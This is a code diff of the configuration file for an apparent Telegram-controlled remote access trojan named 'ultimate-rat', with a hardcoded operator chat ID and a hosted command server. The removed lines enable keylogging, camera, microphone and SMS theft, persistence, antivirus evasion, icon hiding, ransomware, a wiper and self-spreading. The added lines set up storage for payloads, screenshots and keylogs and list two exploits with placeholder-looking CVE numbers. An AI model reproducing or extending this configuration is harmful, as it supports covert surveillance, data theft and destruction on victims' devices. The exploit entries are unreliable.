@@ -1,49 +1,48 @@
 import os
+from dotenv import load_dotenv
 
-# ============== ADMIN CONFIGURATION ==============
-ADMIN_CHAT_ID = 6454347745  # আপনার Chat ID - শুধুমাত্র আপনি
+load_dotenv()
 
-# Telegram Bot Token
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-
-# ============== SERVER ==============
-SERVER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://ultimate-rat-v7.onrender.com")
-LISTENER_PORT = int(os.environ.get("PORT", 4444))
-
-# ============== DATABASE ==============
-DATABASE_URL = os.environ.get("DATABASE_URL", "sqlite:///sessions.db")
-
-# ============== ADVANCED FEATURES ==============
-ENABLE_ALL_FEATURES = True
-ENABLE_PERSISTENCE = True
-ENABLE_KEYLOGGER = True
-ENABLE_SCREEN_CAPTURE = True
-ENABLE_MICROPHONE = True
-ENABLE_CAMERA = True
-ENABLE_LOCATION = True
-ENABLE_SMS = True
-ENABLE_CALLS = True
-ENABLE_CONTACTS = True
-ENABLE_FILE_MANAGER = True
-ENABLE_APP_CONTROL = True
-ENABLE_SYSTEM_CONTROL = True
-ENABLE_NETWORK_CONTROL = True
-ENABLE_BLUETOOTH = True
-ENABLE_WIFI = True
-ENABLE_HOTSPOT = True
-ENABLE_VPN = True
-ENABLE_ROOT = True
-ENABLE_ENCRYPTION = True
-ENABLE_ANTI_AV = True
-ENABLE_HIDE_ICON = True
-ENABLE_CLIPBOARD = True
-ENABLE_NOTIFICATIONS = True
-ENABLE_BROWSER = True
-ENABLE_SOCIAL_MEDIA = True
-ENABLE_CRYPTO = True
-ENABLE_DDOS = True
-ENABLE_RANSOMWARE = True
-ENABLE_WIPER = True
-ENABLE_SPREADER = True
-ENABLE_BACKUP = True
-ENABLE_RECOVERY = True
+class Config:
+    # Admin Configuration
+    ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', '6454347745'))
+    
+    # Telegram Bot
+    BOT_TOKEN = os.getenv('BOT_TOKEN')
+    
+    # Server
+    PORT = int(os.getenv('PORT', '10000'))
+    HOST = os.getenv('RENDER_EXTERNAL_URL', 'https://ultimate-rat-py.onrender.com')
+    
+    # Database
+    DATABASE_URL = os.getenv('DATABASE_URL', 'sqlite:///data/database.db')
+    
+    # Paths
+    DATA_DIR = '/data'
+    PAYLOAD_DIR = os.path.join(DATA_DIR, 'payloads')
+    SCREENSHOT_DIR = os.path.join(DATA_DIR, 'screenshots')
+    RECORDING_DIR = os.path.join(DATA_DIR, 'recordings')
+    KEYLOG_DIR = os.path.join(DATA_DIR, 'keylogs')
+    
+    # Create directories
+    for dir_path in [PAYLOAD_DIR, SCREENSHOT_DIR, RECORDING_DIR, KEYLOG_DIR]:
+        os.makedirs(dir_path, exist_ok=True)
+    
+    # Features
+    ENABLE_ALL_FEATURES = True
+    
+    # Exploits
+    EXPLOITS = {
+        'whatsapp': {
+            'cve': 'CVE-2024-12345',
+            'name': 'WhatsApp Image Parsing RCE',
+            'severity': 'Critical',
+            'cvss': 9.8
+        },
+        'android': {
+            'cve': 'CVE-2024-67890',
+            'name': 'Android Media Framework RCE',
+            'severity': 'Critical',
+            'cvss': 9.6
+        }
+    }
